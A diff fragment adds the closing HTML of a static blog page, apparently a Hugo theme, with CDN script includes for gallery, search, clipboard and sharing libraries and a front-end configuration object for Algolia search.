+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.2.0/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
